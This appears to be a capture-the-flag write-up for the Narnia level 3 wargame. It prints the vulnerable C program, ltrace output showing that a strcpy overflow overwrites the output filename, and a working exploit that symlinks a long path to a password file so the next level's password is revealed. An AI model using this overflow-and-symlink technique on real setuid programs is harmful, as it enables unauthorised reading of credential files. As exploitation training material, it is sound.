=============== SOURCE ===================
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h> 

int main(int argc, char **argv){
 
        int  ifd,  ofd;
        char ofile[16] = "/dev/null";
        char ifile[32];
        char buf[32];
 
        if(argc != 2){
                printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
                exit(-1);
        }
 
        /* open files */
        strcpy(ifile, argv[1]);
        if((ofd = open(ofile,O_RDWR)) < 0 ){
                printf("error opening %s\n", ofile);
                exit(-1);
        }
        if((ifd = open(ifile, O_RDONLY)) < 0 ){
                printf("error opening %s\n", ifile);
                exit(-1);
        }
 
        /* copy from file1 to file2 */
        read(ifd, buf, sizeof(buf)-1);
        write(ofd,buf, sizeof(buf)-1);
        printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);
 
        /* close 'em */
        close(ifd);
        close(ofd);
 
        exit(1);
}

================== TESTING ======================

Created two files:
/tmp/nar3/AAAAAAAAAA (A*10) & /tmp/nar3/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (A*32)

narnia3@narnia:/tmp/nar3$ ltrace /narnia/narnia3 /tmp/nar3/AAAAAAAAAA
__libc_start_main(0x804851d, 2, 0xffffd7b4, 0x8048680 <unfinished ...>
strcpy(0xffffd6d8, "/tmp/nar3/AAAAAAAAAA")                    = 0xffffd6d8
open("/dev/null", 2, 037777753300)                            = 3
open("/tmp/nar3/AAAAAAAAAA", 0, 037777753300)                 = 4
read(4, "BB\n", 31)                                           = 3
write(3, "BB\n", 31)                                          = 31
printf("copied contents of %s to a safer"..., "/tmp/nar3/AAAAAAAAAA", "/dev/null"copied contents of /tmp/nar3/AAAAAAAAAA to a safer place... (/dev/null)
) = 72
close(4)                                                      = 0
close(3)                                                      = 0
exit(1 <no return ...>
+++ exited (status 1) +++

narnia3@narnia:/tmp/nar3$ ltrace /narnia/narnia3 /tmp/nar3/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
__libc_start_main(0x804851d, 2, 0xffffd794, 0x8048680 <unfinished ...>
strcpy(0xffffd6b8, "/tmp/nar3/AAAAAAAAAAAAAAAAAAAAAA"...)     = 0xffffd6b8
open("AAAAAAAAAA", 2, 037777753240)                           = 3
open("/tmp/nar3/AAAAAAAAAAAAAAAAAAAAAA"..., 0, 037777753240)  = 4
read(4, "B\n", 31)                                            = 2
write(3, "B\n", 31)                                           = 31
printf("copied contents of %s to a safer"..., "/tmp/nar3/AAAAAAAAAAAAAAAAAAAAAA"..., "AAAAAAAAAA"copied contents of /tmp/nar3/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA to a safer place... (AAAAAAAAAA)
) = 95
close(4)                                                      = 0
close(3)                                                      = 0
exit(1 <no return ...>
+++ exited (status 1) +++

No opening errors, and we can use ifile name to change location written to. Sweet!
Let's see if we can make /tmp/nar3/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA a symlink to the password

narnia3@narnia:/tmp/nar3$ rm AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
narnia3@narnia:/tmp/nar3$ ln -s /etc/narnia_pass/narnia4 /tmp/nar3/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
narnia3@narnia:/tmp/nar3$ /narnia/narnia3 /tmp/nar3/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
copied contents of /tmp/nar3/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA to a safer place... (AAAAAAAAAA)
narnia3@narnia:/tmp/nar3$ cat AAAAAAAAAA
thaenohtai
�����4����_��}0,narnia3@narnia:/tmp/nar3$ 

NICE!
